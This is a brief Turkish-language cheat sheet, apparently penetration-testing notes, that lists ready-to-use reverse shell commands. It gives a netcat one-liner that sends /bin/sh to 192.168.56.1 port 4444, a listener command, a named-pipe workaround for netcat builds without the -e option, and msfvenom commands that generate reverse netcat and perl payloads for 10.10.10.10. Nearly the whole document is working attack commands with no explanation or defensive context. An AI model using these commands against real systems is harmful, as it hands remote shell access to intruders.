# Get Reverse Shell Traditional

```
nc 192.168.56.1 4444 -e /bin/sh
```

# Listen Shell

```
nc -nvlp 4444
```

### -e parametresi netcat de yoksa

```
mknod /tmp/backpipe p 

/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
```

# MSFVENOM ile tek satırlık shell oluşturma

```
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```

### MSFVENOM reverse netcat

```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.10.10 LPORT=4444 R
```

### MSFVENOM reverse perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 R
```

